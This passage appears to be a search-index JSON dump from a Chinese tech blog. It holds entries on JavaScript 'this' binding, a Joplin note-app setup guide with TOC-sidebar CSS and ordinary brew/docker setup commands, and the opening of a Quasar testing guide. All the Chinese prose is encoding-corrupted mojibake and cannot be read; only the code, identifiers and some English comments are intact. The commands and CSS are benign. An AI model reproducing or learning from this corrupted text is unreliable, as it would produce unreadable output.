çš„é»˜è®¤ç»‘å®šï¼šå†…éƒ¨å‡½æ•°ï¼ˆæˆ–è€…å…¶ä»–ç±»ä¼¼çš„æ‰¾ä¸åˆ° this æŒ‡å‘çš„æƒ…å†µï¼‰ä¸­çš„ this æŒ‡å‘ windowï¼ˆä¸¥æ ¼æ¨¡å¼ä¸‹æŒ‡å‘ undefinedï¼‰ï¼š var a = { b: 1, getB: function () { function c() { console.log(this.b) // undefined } c() // window.c() console.log(this.b) // 1ï¼ˆéšå¼ç»‘å®šï¼‰ }, } a.getB() åŒç†ï¼Œå›è°ƒå‡½æ•°ä¹Ÿå¸¸å¸¸ä¼šä¸¢å¤± thisã€‚ new è°ƒç”¨çš„æ‰€è°“ â€œæ„é€ å‡½æ•°â€ å®é™…ä¸Šæ˜¯å¯¹æ–°åˆ›å»ºçš„å¯¹è±¡è¿›è¡Œåˆå§‹åŒ–çš„ä¸€ç§â€œæ„é€ è°ƒç”¨â€ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š åˆ›å»ºæ–°å¯¹è±¡ï¼› æ‰§è¡Œ [[Prototype]] è¿æ¥ï¼› ç»‘å®š thisï¼Œå³æ‰€è°“çš„ new ç»‘å®šï¼› å¦‚æœè°ƒç”¨çš„å‡½æ•°æ²¡æœ‰è¿”å›å¯¹è±¡ï¼Œåˆ™è¿”å›è¯¥æ–°å¯¹è±¡ ä¼˜å…ˆçº§ï¼šnew ç»‘å®š \u003e æ˜¾å¼ç»‘å®š \u003e éšå¼ç»‘å®š \u003e é»˜è®¤ç»‘å®š ç®­å¤´å‡½æ•°è‡ªåŠ¨ç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„ thisï¼Œä¸”æ— æ³•ä¿®æ”¹ã€‚ ","date":"2021-07-29","objectID":"/js-misc/:4:0","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["å‰ç«¯"],"content":"å…¶ä»– sort é»˜è®¤å°†å…ƒç´ è½¬ä¸ºå­—ç¬¦ä¸²åå‡åºæ’åºã€‚ var arr = [2, 13, 3, 11, 5, 7] arr.sort() // [11,13,2,3,5,7] ","date":"2021-07-29","objectID":"/js-misc/:5:0","tags":["Javascript"],"title":"æ¸©æ•…çŸ¥æ–°ï¼šJavascript æ‚è®°","uri":"/js-misc/"},{"categories":["æ¢ç´¢"],"content":"æŠ˜è…¾ç¬”è®°è½¯ä»¶ã€‚ ","date":"2021-07-17","objectID":"/joplin/:0:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"èƒŒæ™¯ è¯´æ˜¯è¦æ‰¾ä¸€æ¬¾ç¬”è®°è½¯ä»¶ï¼Œå®é™…ä¸Šæˆ‘æœ€ä¸»è¦çš„éœ€æ±‚è¿˜æ˜¯å‰ªè—ç½‘é¡µç¦»çº¿æµè§ˆã€å…¨æ–‡æœç´¢ã€æœ¬åœ°å’Œäº‘ç«¯åŒæ­¥è¿™äº›åŠŸèƒ½ï¼Œå› ä¸ºè‡ªå·±å†™çš„ç¬”è®°ä¸»è¦é  Typora + Hexo + ghPages æ”¾åœ¨è¿™ä¸ªåšå®¢é‡Œã€‚ç”±äºä¸æ˜¯ç‰¹åˆ«åˆšéœ€ï¼Œå°±æ²¡æœ‰ä»€ä¹ˆä»˜è´¹çš„æ„æ„¿ã€‚åœ¨ Big Sur 11.4 M1 ä¸Šç»è¿‡äº†ä¸€ç•ªæŠ˜è…¾ï¼Œå‘ç°ä»¥ä¸‹è½¯ä»¶éƒ½ä¸èƒ½å¾ˆå¥½çš„å¥‘åˆéœ€æ±‚ï¼š å°è±¡ç¬”è®°ï¼šå‰ªè—åŠŸèƒ½éå¸¸å¥½ç”¨ï¼Œæ•ˆæœä¹Ÿæ˜¯èƒ½æ‰¾åˆ°çš„å·¥å…·ä¸­æœ€ä½³çš„ï¼Œç„¶è€Œæœ‰æ—¶å€™æ’ç‰ˆæ•ˆæœä¸æ€ä¹ˆæ ·ï¼›å…è´¹ç‰ˆæ¯æœˆ 60M ä¸Šä¼ é™åˆ¶æœ‰ç‚¹å°‘ï¼›æœ€è®©äººä¸èƒ½å¿å—çš„åˆ™æ˜¯å…¶ bug é¢‘å‡ºçš„æ¡Œé¢å®¢æˆ·ç«¯ã€‚ æœ‰é“äº‘ç¬”è®°ï¼šå‰ªè—æ•ˆæœä¸ä½³ï¼Œæ•´ä½“ä½¿ç”¨ä½“éªŒä¹Ÿä¸€èˆ¬ã€‚ ä¸ºçŸ¥ç¬”è®° / Baklib ç­‰ï¼šæ²¡æœ‰é•¿æœŸå¯ç”¨çš„å…è´¹ç‰ˆã€‚ OneNoteï¼šå¯¹æˆ‘æ¥è¯´ç¬”è®°è‡ªç”±åº¦æœ‰ç‚¹å¤ªé«˜äº†ï¼›åŒæ­¥é€Ÿåº¦é—®é¢˜æ¯”è¾ƒå¤§ã€‚ Notionï¼šåŒç±»å¤©èŠ±æ¿ï¼Œä¸è¿‡å­¦ä¹ æˆæœ¬æœ‰ç‚¹é«˜ï¼Œç›¸å½“å¤šçš„å¼ºå¤§åŠŸèƒ½å¯¹æˆ‘è€Œè¨€ä¹Ÿä¸å¤ªå¿…è¦ï¼›åŒæ ·é¢ä¸´å‰ªè—æ•ˆæœå’ŒåŒæ­¥é€Ÿåº¦çš„å°´å°¬é—®é¢˜ã€‚ wolaiï¼šNotion æœ¬åœ°åŒ–çš„ç‰ˆæœ¬ï¼Œæ²¡æœ‰åŒæ­¥é€Ÿåº¦çš„é—®é¢˜ï¼Œå…¶ä»–é—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œä¸” bug ä¸å°‘ã€‚ä¾èµ– web-clipperï¼Œè™½ç„¶å¾ˆå¤šäººéƒ½è¯´å¥½ç”¨ï¼Œä½†æ˜¯è¿™ä¸ªé€‚é…äº†å¾ˆå¤šç¬”è®°è½¯ä»¶çš„å·¥å…·çš„å‰ªè—æ•ˆæœå¯¹æˆ‘æ¥è¯´ä¾ç„¶ä¸å¤Ÿå¥½ã€‚ Bearï¼šä¾èµ– web-clipperï¼›éä¼šå‘˜æ— æ³•å¯¼å‡º PDFã€‚ç›®å‰å¯¹ Typora å¾ˆæ»¡æ„ï¼Œä»¥åå¯èƒ½ä¼šå…¥æ‰‹ä¼šå‘˜ã€‚ è¯­é›€ï¼šä¾èµ– web-clipperï¼›å’ŒçŸ³å¢¨æ–‡æ¡£å¾ˆåƒï¼Œæ„Ÿè§‰æ›´é€‚åˆå›¢é˜Ÿç”¨æ¥å†™å…±äº«çš„æŠ€æœ¯æ–‡æ¡£ï¼Œå¯¹ä¸ªäººæ¥è¯´æœ‰ç‚¹å¤ªé‡äº†ã€‚ èš‚èšç¬”è®°ï¼šå¼€æºï¼Œä¾èµ– web-clipperï¼›ç•Œé¢ã€åŠŸèƒ½éƒ½ç›¸å½“ç®€é™‹ï¼Œbug è¾ƒå¤šã€‚ ä¸“æ³¨ç¬”è®°ï¼šä¾èµ– web-clipperï¼›åŠŸèƒ½æ¯”è¾ƒå°‘ã€‚ Cuboxï¼šå…è´¹ç‰ˆ 200 æ¡å‰ªè—æœ‰ç‚¹ä¸å¤Ÿç”¨ã€‚ Obisidian / Roam Research ç­‰ï¼šåŠŸèƒ½å¾ˆå¼ºå¤§ä½†ä¼¼ä¹ç¡®å®ç”¨ä¸ä¸Šã€‚ Flomo / Google Keep / Pocket / Instapaper / Pinbox / æ–¹ç‰‡ç­‰ï¼šæ„Ÿè§‰äº§å“å®šä½ä¸å¤ªç¬¦åˆè‡ªå·±çš„éœ€æ±‚ã€‚ æœ€åé€‰æ‹©äº†å¼€æºçš„ Joplinï¼Œç›¸æ¯”åŒæ ·å¼€æºçš„èš‚èšç¬”è®°ï¼Œä½¿ç”¨ä½“éªŒæ˜æ˜¾è¦å¥½å¾ˆå¤šã€‚æœ€é‡è¦çš„æ˜¯ï¼Œå…¶å‰ªè—æ•ˆæœæˆ‘è®¤ä¸ºæ˜¯ä»…æ¬¡äºã€ç”šè‡³éƒ¨åˆ†æƒ…å†µä¸‹ä¼˜äºå°è±¡ç¬”è®°å‰ªè—çš„ã€‚ ","date":"2021-07-17","objectID":"/joplin/:1:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"åŸºç¡€é…ç½® å®˜ç½‘ ä¸‹è½½åï¼Œå¯ä»¥è¿›è¡Œä¸€äº›ç®€å•é…ç½®ï¼š é€šç”¨é€‰é¡¹ï¼šä¿®æ”¹è¯­è¨€ã€æ—¥æœŸæ ¼å¼å’Œä½¿ç”¨çš„å¤–éƒ¨ Markdown ç¼–è¾‘å™¨ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ /Applications/Typora.appã€‚ åŒæ­¥ï¼šä¿®æ”¹äº‘åŒæ­¥çš„é€‰é¡¹ã€‚ å¤–è§‚ï¼šä¿®æ”¹ä¸»é¢˜ã€å­—ä½“å¤§å°å’Œè‡ªå®šä¹‰ cssã€‚æˆ‘ä¸æ€ä¹ˆç”¨ Dracula é…è‰²ï¼Œä¸è¿‡è¿™ä¸ªè½¯ä»¶é‡Œçš„ Dracula è¿˜ç®—æŒºå¥½çœ‹çš„ã€‚åæ–‡ä¼šé˜è¿°å¦‚ä½•é€šè¿‡é…ç½®è‡ªå®šä¹‰ css å®ç°ä¾§è¾¹æ ç›®å½•çš„åŠŸèƒ½ã€‚ ç¬”è®°ï¼šå¯ä»¥é€‰æ‹©ä¸æŠŠåœ°ç†ä½ç½®ä¿¡æ¯ä¿å­˜åˆ°ç¬”è®°ä¸­ã€‚ æ’ä»¶ï¼šå¯ä»¥æœç´¢å®‰è£…æ’ä»¶ï¼Œå½“ç„¶ä¹Ÿèƒ½è‡ªå·±å¼€å‘ä¸€ä¸ªè£…ä¸Šå»ï¼Œè¿™æ˜¯å¼€æºè½¯ä»¶çš„æœ€å¤§ä¼˜åŠ¿äº†ã€‚ Markdownï¼šå¯ä»¥å¼€å…³å„ç§ Markdown çš„åŠŸèƒ½ï¼Œè¿™é‡Œå¯ä»¥å‘ç° Joplin ç›¸æ¯”éƒ¨åˆ†åŒç±»äº§å“åœ¨ Markdown æ”¯æŒä¸Šçš„ä¼˜åŠ¿ã€‚ ç¬”è®°å†å²ï¼šä¿®æ”¹ç¬”è®°å†å²çš„ä¿ç•™æœŸé™ï¼Œç›´æ¥å½±å“ Joplin è®°å½•çš„ç¬”è®°å ç”¨çš„ç£ç›˜ç©ºé—´å¤§å°ã€‚ åŠ å¯†ï¼šè¿™ä¸ªéƒ¨åˆ†å»ºè®®å‚è€ƒ å®˜æ–¹æ–‡æ¡£ï¼Œå¦åˆ™å¯èƒ½åœ¨è§£å¯†æ—¶é‡åˆ°é—®é¢˜ã€‚ ç½‘é¡µå‰ªè¾‘å™¨ï¼šåœ¨å®¢æˆ·ç«¯å¯ç”¨ç½‘é¡µå‰ªè¾‘æœåŠ¡ï¼Œéšååœ¨ Chrome åº”ç”¨å•†åº—å¯ä»¥ä¸‹è½½å®‰è£… Joplin Web Clipperï¼Œé¦–æ¬¡å¯åŠ¨è¯¥æ’ä»¶éœ€è¦å›åˆ° Joplin å®¢æˆ·ç«¯æˆäºˆæƒé™ï¼›å¦‚æœä½¿ç”¨ç±»ä¼¼ web-clipper çš„ç¬¬ä¸‰æ–¹å‰ªè—å·¥å…·ï¼Œåˆ™å¯ä»¥å¤åˆ¶è¯¥é¡µä¸‹æ–¹çš„æˆæƒä»¤ç‰Œã€‚ ","date":"2021-07-17","objectID":"/joplin/:2:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"ä¾§è¾¹æ ç›®å½• Joplin é»˜è®¤æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œä½†æ˜¯æ”¯æŒ Markdown çš„ç›®å½•æ‰©å±•ï¼Œæ‰€ä»¥åœ¨ç¬”è®°ä»»æ„ä½ç½®æ’å…¥ [toc] å³å¯ç”Ÿæˆç›®å½•ã€‚ä¸ºäº†è®©è¿™ä¸ªç›®å½•æ‚¬æµ®åˆ°å³è¾¹ï¼Œå‚è€ƒ å®˜æ–¹è®ºå›ä¸Šçš„ä¸€ä¸ªå›ç­” ç®€å•å†™ä¸ª cssï¼ˆè¿™é‡Œçš„èƒŒæ™¯è‰²æ˜¯æ ¹æ® Dracula ä¸»é¢˜è®¾ç½®çš„ï¼Œå¯è‡ªè¡Œä¿®æ”¹ï¼‰ï¼š /* For styling the rendered Markdown */ :root { /*TOCsidebar çš„ç›¸å…³å˜é‡ , Toc SideBar variables definition */ --tocsidebar-fontsize: 16px; /*TocSideBar çš„å­—ä½“å¤§å°ï¼ŒTocSideBar's fontsize*/ --tocsidebar-bg: #313640; /*TocSideBar çš„é¢æ¿èƒŒæ™¯è‰² , TocSideBar's panel color*/ --tocsiderbar-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.2); /*TocSideBar çš„é˜´å½±è®¾ç½® , TocSideBar's shadow */ --tocsiderbar-radius:10px; /*TocSideBar çš„åœ†è§’åº¦ , TocSideBar's radius */ --tocsiderbar-leftline: 1px solid rgba(255, 255, 255, 0.5); /*TocSideBar å·¦è¾¹ç«–çº¿çº¿é¢œè‰²å’Œä¸é€æ˜åº¦ï¼Œ0 ä¸ºå…¨é€æ˜ï¼Œ1 ä¸ºä¸é€æ˜, TocSideBar's left line for Classification befor link*/ --tocsidebar-linkcolor: #FFFFFF; /*TocSideBar é“¾æ¥é¢œè‰² , link color*/ --tocsidebar-linkcolor-opacity: 0.8; /*TocSideBar é“¾æ¥é¢œè‰²çš„ä¸é€æ˜åº¦, link color's opacity */ --tocsidebar-linkhovercolor: #E71B64; /*TocSideBar é“¾æ¥æ‚¬åœæ—¶çš„é¢œè‰² #E71B64 - ç«çº¢è‰², link color when cursor hovering */ --tocsidebar-linkhovercoloropacity: 1; /*TocSideBar é“¾æ¥æ‚¬åœæ—¶çš„é¢œè‰²çš„ä¸é€æ˜åº¦, link color's opacity when cursor hovering */ } /************************************************************************************************** * TABLE OF CONTENTS * Based on the idea from here: * -https://discourse.joplinapp.org/t/toc-as-the-sidebar/5979/8 * -https://discourse.joplinapp.org/t/toc-as-the-sidebar/5979/34 * -https://discourse.joplinapp.org/t/share-your-css/1730/192 *************************************************************************************************/ nav.table-of-contents \u003e ul { /*é¢æ¿å›ºå®šåœ¨å³ä¸Šè§’, fix Toc panel on the right of the window , this panel is used for activing toc sidebar */ position: fixed; top: 0; right: 6px; z-index: 10; font-size: var(--tocsidebar-fontsize); /*ç›®å½•å­—ä½“å¤§å°ï¼Œå¯è®¾ç½®ä¸º 16PX æˆ– small,16px æ¯”è¾ƒåˆé€‚ï¼Œ toc sidebar's fontsize, 16px is better for our eyes*/ height: 85%; padding: 5px; overflow: hidden; min-width: 20px; /* å³ä¾§é¢æ¿å®½åº¦, ä¹Ÿå¯ç”¨ width: 20px; è®¾ç½®åœ¨é¼ æ ‡åˆ°è¾¾å³ä¾§ 20px èŒƒå›´å†…æ—¶æ¿€æ´» TocSideBar, 20px means the Toc sidebar will be active when cursor within 20px on the right side of the window */ background: none; /* é¢æ¿æ— èƒŒæ™¯è‰²å¡«å…… */ } nav.table-of-contents ul { /*æ‰€æœ‰ç›®å½• li çš„çˆ¶æ¡† ul è®¾ç½®ï¼Œå³æ‰€æœ‰ç›®å½•çˆ¶æ¡†çš„è®¾ç½®*/ list-style-type: none; margin-bottom: 0; margin-left: 8px; /*åˆ†ç±»è·ç¦» tocsidebar è¾¹ç¼˜ï¼Œ8px*/ margin-top: 0; } nav.table-of-contents \u003e ul:hover { /*TocSideBar å¼¹å‡ºæ—¶ï¼ŒèƒŒæ™¯åº•æ¡†çš„è®¾ç½® æ‰€ä»¥ç”¨ \u003e åªé€‰æ‹©ä¸€çº§ç›®å½• li çš„çˆ¶æ¡† ul ï¼Œå¡«å……èƒŒæ™¯è‰²å’Œé˜´å½±ä»¥æ˜¾ç¤º TocSideBar*/ background-color: var(--tocsidebar-bg); border-radius: var(--tocsiderbar-radius); box-shadow: var(--tocsiderbar-shadow); overflow: scroll; width: auto; /*æ ¹æ®å†…å®¹è‡ªåŠ¨è°ƒæ•´å®½åº¦ , ä½†ä¼šå¯¼è‡´å­—ä½“åŠ ç²—æ˜¾ç¤ºæ—¶è·³åŠ¨, Automatically adjust width according to content */ } nav.table-of-contents \u003e ul:hover li { display: list-item; min-width: 120px; /*Toc SideBar æœ€å°å®½åº¦ï¼ŒToc SideBar 's minimum width*/ } nav.table-of-contents li { display: none; line-height: 1.8em; margin-bottom: 0; white-space: nowrap; } nav.table-of-contents \u003e ul \u003e li \u003e ul li { /*è®¾ç½®ç›®å½•å‰çš„åˆ†ç±»çº¿ï¼Œä¹Ÿå¯ä»¥è¿™æ · (ç©ºæ ¼è¡¨ç¤ºæ‰€æœ‰å­å­™ä»£ li) å†™ nav.table-of-contents ul li ul li */ border-left: var(--tocsiderbar-leftline); !important; } nav.table-of-contents li a { color: var(--tocsidebar-linkcolor); opacity: var(--tocsidebar-linkcolor-opacity); padding: 5px; } nav.table-of-contents a { /*å»æ‰ä¸‹åˆ’çº¿, remove link's underline */ text-decoration: none !important; } nav.table-of-contents li a:hover { /*æ‚¬åœæ—¶ï¼Œæ”¹å˜å­—ä½“æ ·å¼ï¼Œchange font style when cursor hovering*/ color: var(--tocsidebar-linkhovercolor); /*link color when cursor hovering */ opacity: var(--tocsidebar-linkhovercoloropacity); } ä¿å­˜åˆ° ~/.config/joplin-desktop/userstyle.css å¹¶é‡å¯å®¢æˆ·ç«¯å³å¯ã€‚ ","date":"2021-07-17","objectID":"/joplin/:3:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"ä¿®æ”¹ Markdown å±•ç¤ºå­—ä½“å¤§å° åœ¨é…ç½®é‡Œå¯ä»¥ç›´æ¥ä¿®æ”¹ Markdown ç¼–è¾‘æ—¶çš„å­—ä½“å¤§å°ï¼Œè€Œå±•ç¤ºæ—¶çš„å­—ä½“å¤§å°åˆ™éœ€è¦ä¿®æ”¹ä¹‹å‰æåˆ°çš„ userstyle.cssï¼š body, th, td, .inline-code { font-size: 18px; } ","date":"2021-07-17","objectID":"/joplin/:4:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"é…åˆç®€æ‚¦ä½¿ç”¨ ç®€æ‚¦ ä¹Ÿæä¾›äº† Chrome æ’ä»¶ï¼Œä¸»è¦æ˜¯æä¾›çº¯å‡€é˜…è¯»è§†å›¾çš„ã€‚è™½ç„¶çš„ç¡®æ˜¯å¾ˆä¼˜ç§€çš„è½¯ä»¶ï¼Œä¹Ÿèƒ½åšåˆ°å¼€ç®±å³ç”¨ï¼Œä½†æ˜¯è¿‡å¤šçš„é…ç½®é¡¹æ€»ä¼šè®©äººæ„Ÿåˆ°æœ‰äº›æ— æ‰€é€‚ä»ï¼ˆå³ä½¿æ˜¯åœ¨ç®€æ´æ¨¡å¼ä¸‹ï¼‰ã€‚ åœ¨å‰ªè—å¾®ä¿¡å…¬ä¼—å·æ–‡ç« æ—¶æ— æ„ä¸­å‘ç°ï¼ŒJoplin çš„å‰ªè—å·¥å…·å¯¹å…¶ä¸­å›¾ç‰‡çš„å¤„ç†æœ‰äº›é—®é¢˜ï¼ˆè€å°é—­å¹³å°äº†ï¼‰ï¼Œè€Œç»è¿‡ç®€æ‚¦å¤„ç†åå†ç”¨ Joplin å‰ªè—åˆ™æ•ˆæœå®Œç¾ï¼Œå› æ­¤å°† mp.weixin.qq.com åŠ å…¥åˆ°äº†ç®€æ‚¦ç™½åå•é‡Œï¼Œåæ­£æœ¬æ¥è¯»å…¬ä¼—å·æ–‡ç« ä¹Ÿè¦å¼€é˜…è¯»æ¨¡å¼çš„ã€‚ æ­¤å¤–ï¼Œç®€æ‚¦ä¹Ÿæ”¯æŒç»‘å®š Joplin å¹¶åœ¨é˜…è¯»æ¨¡å¼ä¸‹ç›´æ¥ â€œä¿å­˜åˆ° Joplinâ€ï¼Œç„¶è€Œæˆ‘å¹¶ä¸æ¨èè¿™æ ·åšã€‚ç®€æ‚¦å¯¹ä¸å°‘éä¸­æ–‡ç½‘ç«™ä»¥åŠå°ä¼—ç«™ç‚¹çš„æ”¯æŒç›¸å½“æœ‰é™ï¼Œé˜…è¯»æ¨¡å¼ä¹Ÿç»å¸¸ä¼šå‡ºç°ä¸€äº›æ ¼å¼é”™è¯¯ï¼Œå’Œ web-clipper å‰ªè—æ•ˆæœæ˜¯ç±»ä¼¼çš„ã€‚å› æ­¤ï¼Œè¿˜æ˜¯ä½¿ç”¨ Joplin Web Clipper åšå‰ªè—èƒ½ä¿è¯æœ€ä½³çš„æ•ˆæœã€‚ ","date":"2021-07-17","objectID":"/joplin/:5:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"æ¸…ç†æ— ç”¨å›¾ç‰‡ å‰ªè—ç½‘é¡µæ—¶ï¼Œå‰ªè—å›¾ç‰‡æ˜¯éå¸¸é‡è¦çš„ï¼Œä½†æ–‡ç« ä¸­é—´æˆ–è€…æœ«å°¾æ€»ä¼šå‡ºç°æˆ‘ä»¬ä¸æ€ä¹ˆéœ€è¦çš„å›¾ç‰‡ã€‚ç”±äº Joplin ç¼“å­˜å†å²çš„æœºåˆ¶ï¼Œåœ¨ç¬”è®°ä¸­åˆ é™¤äº†è¿™äº›å›¾ç‰‡åä¸ä¼šåœ¨æœ¬åœ°ç«‹å³æ¸…ç†æ‰è¿™äº›æ— ç”¨çš„å›¾ç‰‡ã€‚å› æ­¤æ‰¾åˆ°äº†ä¸€æ¬¾å·¥å…· jnrmor æ¥è¾…åŠ©å®ç°è¯¥åŠŸèƒ½ï¼Œä¸å¤ªæ¸…æ¥š Joplin çš„å®˜æ–¹ CLI æˆ–è€… API èƒ½ä¸èƒ½å®ç°ã€‚ ä¸‹è½½ jnrmor è„šæœ¬åï¼Œé¦–å…ˆå®‰è£…æ–°çš„ get-optï¼š $ brew install gnu-getopt éšåå°†æ–°çš„ get-opt æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼Œé¿å…ä½¿ç”¨è‡ªå¸¦çš„ get-optã€‚åœ¨ .zshrc æˆ– .bashrc æœ«å°¾å†™å…¥ï¼š export PATH=\"/opt/homebrew/opt/gnu-getopt/bin:$PATH\" æ¥ä¸‹æ¥ç¼–è¾‘é…ç½®æ–‡ä»¶ .jnrmor.confï¼š # Joplin profile directory (where the database is located) JOPLIN_DIR=~/.config/joplin-desktop # TOKEN for Joplin Web Clipper (can be found in'Web clipper options') CLIPPER_TOKEN=xxxxxxxx # Web Clipper Port (can be found in'Web clipper options') CLIPPER_PORT=41184 æ³¨æ„å°† xxxxxxxx æ›¿æ¢ä¸ºè‡ªå·±çš„æˆæƒä»¤ç‰Œã€‚æœ€åè¿è¡Œ ./jnrmor å³å¯ã€‚ ","date":"2021-07-17","objectID":"/joplin/:6:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"è‡ªå»º Joplin Server è¿›è¡Œäº‘åŒæ­¥ å‚è€ƒ å®˜æ–¹æ–‡æ¡£ å’Œè¿™ç¯‡æ–‡ç« ï¼Œæ—¢å¯ä»¥ç”¨å…¶å†…ç½® SQLite çš„ docker æ¥æµ‹è¯•ï¼Œåˆå¯ä»¥ç”¨ docker-compose åŒæ—¶å¯åŠ¨ PostgreSQL å’Œ Joplin Serverã€‚ .env æ–‡ä»¶ï¼š APP_BASE_URL=http://ip:port # modify ip and port APP_PORT=22300 éšåè¿è¡Œï¼š $ docker volume create joplin $ docker run -d --name joplin_server -v joplin:/home/joplin --env-file ~/joplin/.env -p port:22300 joplin/server:2.2.7-beta # modify port æ³¨æ„ä½¿ç”¨ latest é•œåƒå¯èƒ½å¯¼è‡´å‡ºç° Not allowed: PUT çš„é—®é¢˜ï¼Œéœ€è¦ä½¿ç”¨æœ€æ–°çš„ beta é•œåƒç¡®ä¿å‡çº§åˆ° v2ï¼Œå‚è€ƒ å®˜æ–¹è®ºå›ã€‚ ç™»å½• Joplin Server åä¿®æ”¹é‚®ç®±å’Œå¯†ç ï¼Œå°†ç›¸åŒé…ç½®å¡«å…¥å®¢æˆ·ç«¯çš„åŒæ­¥é€‰é¡¹ä¸­å³å¯ã€‚ ","date":"2021-07-17","objectID":"/joplin/:7:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["æ¢ç´¢"],"content":"Joplin ç¼ºç‚¹ è‹±æ–‡æ ‡ç­¾åªèƒ½ä½¿ç”¨å°å†™å­—æ¯ï¼ˆå¦‚æœè¿™ä¹Ÿç®—ç¼ºç‚¹çš„è¯ï¼‰ äº‘åŒæ­¥æ¥å£ä¸å¤š å‰ªè—å¢™å¤–æ–‡ç« é€Ÿåº¦ä¼šæœ‰ç‚¹æ…¢ï¼Œè¿˜æ²¡ç ”ç©¶è¿‡æ€ä¹ˆç»™å®ƒé…ä»£ç† UI å¯ä»¥æ›´å¥½çœ‹ ","date":"2021-07-17","objectID":"/joplin/:8:0","tags":["Joplin"],"title":"ä¿¡æ‰‹æ‹ˆæ¥ï¼šJoplin ä½¿ç”¨å°è®°","uri":"/joplin/"},{"categories":["å‰ç«¯"],"content":"å¯¹ Quasar æ–‡æ¡£æµ‹è¯•éƒ¨åˆ† å’Œ @quasar/testing æ–‡æ¡£ éƒ¨åˆ†å†…å®¹è¿›è¡Œäº†ç®€å•ç¿»è¯‘ï¼Œé¡ºä¾¿è®°å½•äº†ä¸€äº›ç›®å‰ä½¿ç”¨ Quasar æ¡†æ¶è¿›è¡Œæµ‹è¯•æ—¶å­˜åœ¨çš„é—®é¢˜ã€‚ Quasar v1 é¡¹ç›®å¯ä»¥é€šè¿‡ @quasar/testing æ¨¡å—æ·»åŠ å¤šç§å•å…ƒæµ‹è¯•å’Œ e2e æµ‹è¯•å¥—ä»¶ã€‚å®é™…ä¸Šåšçš„äº‹æƒ…å°±æ˜¯è£…ä¸€äº› node æ¨¡å—ã€ç”Ÿæˆä¸€äº›é…ç½®æ–‡ä»¶ã€æœ€ååœ¨ package.json é‡ŒåŠ ç‚¹è„šæœ¬ã€‚ç†è®ºä¸Šè¿˜å¯ä»¥ç»“åˆ CI ä½¿ç”¨ï¼Œä¸è¿‡æˆ‘è¿˜æ²¡è¯•ã€‚ æˆªæ­¢ç›®å‰ï¼Œ@quasar/testing å°šæœªè¿ç§»åˆ° Quasar v2ã€‚ @quasar/testing å®é™…ä¸Šæ˜¯ Quasar æ¡†æ¶çš„ä¸€ä¸ª App Extensionï¼Œæ‰€ä»¥åªèƒ½ç»“åˆ Quasar CLI ä½¿ç”¨ï¼ˆä¸€èˆ¬ä¹Ÿä¸ä¼šç”¨åˆ«çš„ï¼‰ï¼Œå¹¶ä¸”åªèƒ½é€šè¿‡ quasar ext add å‘½ä»¤æ¥å®‰è£…ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:0:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"è½¯ä»¶æµ‹è¯• æµ‹è¯•æœ¬èº«å¹¶ä¸éš¾ï¼Œæœ€å›°éš¾çš„æ˜¯æ­æµ‹è¯•çš„ç¯å¢ƒã€‚æµ‹è¯•çš„å…³é”®åœ¨äºäº†è§£åˆ°åº•è¦æµ‹è¯•ä»€ä¹ˆã€‚ æµ‹è¯•åŠŸèƒ½ï¼ˆfunctionalityï¼‰ï¼Œè€Œä¸æ˜¯å‡½æ•°ï¼ˆfunctionï¼‰ã€‚ æµ‹è¯•é©±åŠ¨å¼€å‘èƒ½å¤Ÿè®©ä½ å†™å‡ºæ›´å¥½çš„ï¼ˆä»¥åŠæ›´å°‘çš„ï¼‰æµ‹è¯•ã€‚å°½ç®¡è¿™æ ·çœ‹èµ·æ¥é™ä½äº†æ•ˆç‡ï¼Œä½†é•¿è¿œæ¥çœ‹èƒ½å¤Ÿæå¤§å‡å°‘é¡¹ç›®ä¸­çš„ bug å’Œç»´æŠ¤æˆæœ¬ï¼Œå°±åƒä¹°äº†å¿…å®šèµ”ä»˜çš„ä¿é™©ä¸€æ ·ã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰ä¸œè¥¿éƒ½å€¼å¾—è¢«æµ‹è¯•ï¼Œæˆ–è€…å€¼å¾—åœ¨æ›´é«˜å±‚é¢è¢«æµ‹è¯•ã€‚æ¯”å¦‚æœ‰äº›åŠŸèƒ½ç”¨ e2e æµ‹è¯•å°±å¥½ï¼Œä¸ç”¨å•å…ƒæµ‹è¯•ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:1:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing 